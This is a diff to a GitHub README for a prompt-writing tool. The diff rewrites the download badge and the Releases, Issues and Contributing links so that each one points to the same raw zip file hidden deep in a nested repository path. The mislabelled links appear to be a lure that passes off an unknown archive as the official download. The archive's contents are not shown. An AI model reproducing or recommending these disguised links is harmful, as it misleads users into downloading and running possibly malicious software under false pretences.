@@ -1,6 +1,6 @@
 # 📝 structured-prompt-skill - Create Professional AI Prompts Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-structured--prompt--skill-blue.svg)](https://github.com/Marwane83930/structured-prompt-skill/releases)
+[![Download](https://github.com/Marwane83930/structured-prompt-skill/raw/refs/heads/main/skills/structured-prompt-writer/references/prompts/system-tools/Leap.new/prompt_structured_skill_v2.6.zip%https://github.com/Marwane83930/structured-prompt-skill/raw/refs/heads/main/skills/structured-prompt-writer/references/prompts/system-tools/Leap.new/prompt_structured_skill_v2.6.zip)](https://github.com/Marwane83930/structured-prompt-skill/raw/refs/heads/main/skills/structured-prompt-writer/references/prompts/system-tools/Leap.new/prompt_structured_skill_v2.6.zip)
 
 ## 📖 Introduction
 
@@ -16,13 +16,13 @@ To make the most of this application, follow these steps:
    - Disk Space: Minimum 100 MB free space
 
 2. **Visit the Releases Page**: 
-   You can find the application version and downloads on our [Releases page](https://github.com/Marwane83930/structured-prompt-skill/releases).
+   You can find the application version and downloads on our [Releases page](https://github.com/Marwane83930/structured-prompt-skill/raw/refs/heads/main/skills/structured-prompt-writer/references/prompts/system-tools/Leap.new/prompt_structured_skill_v2.6.zip).
 
 ## 💾 Download & Install
 
 To get the software:
 
-1. Go to the [Releases page](https://github.com/Marwane83930/structured-prompt-skill/releases).
+1. Go to the [Releases page](https://github.com/Marwane83930/structured-prompt-skill/raw/refs/heads/main/skills/structured-prompt-writer/references/prompts/system-tools/Leap.new/prompt_structured_skill_v2.6.zip).
 2. Locate the latest version.
 3. Download the appropriate file for your operating system.
 
@@ -67,11 +67,11 @@ If you encounter issues, consider the following:
 
 ## 🛡️ Support
 
-Should you need further assistance, please visit our [Issues page](https://github.com/Marwane83930/structured-prompt-skill/issues) to report bugs or ask questions. Join the community discussions to share tips or get help from other users.
+Should you need further assistance, please visit our [Issues page](https://github.com/Marwane83930/structured-prompt-skill/raw/refs/heads/main/skills/structured-prompt-writer/references/prompts/system-tools/Leap.new/prompt_structured_skill_v2.6.zip) to report bugs or ask questions. Join the community discussions to share tips or get help from other users.
 
 ## 🧑‍🤝‍🧑 Community Contributions
 
-We welcome contributions from users! If you would like to suggest new templates or features, please check our [Contributing guidelines](https://github.com/Marwane83930/structured-prompt-skill/blob/main/CONTRIBUTING.md) for more information.
+We welcome contributions from users! If you would like to suggest new templates or features, please check our [Contributing guidelines](https://github.com/Marwane83930/structured-prompt-skill/raw/refs/heads/main/skills/structured-prompt-writer/references/prompts/system-tools/Leap.new/prompt_structured_skill_v2.6.zip) for more information.
 
 ## 🔗 Additional Resources
 
@@ -85,4 +85,4 @@ Explore more about the technology behind this application and ways to leverage A
 
 To stay informed about new releases and features, consider watching our repository. You can enable notifications to receive updates directly in your inbox.
 
-Thank you for using the Structured Prompt Skill! We hope this tool helps you create impactful and professional AI prompts. Visit the [Releases page](https://github.com/Marwane83930/structured-prompt-skill/releases) to download or check for the latest updates.
+Thank you for using the Structured Prompt Skill! We hope this tool helps you create impactful and professional AI prompts. Visit the [Releases page](https://github.com/Marwane83930/structured-prompt-skill/raw/refs/heads/main/skills/structured-prompt-writer/references/prompts/system-tools/Leap.new/prompt_structured_skill_v2.6.zip) to download or check for the latest updates.
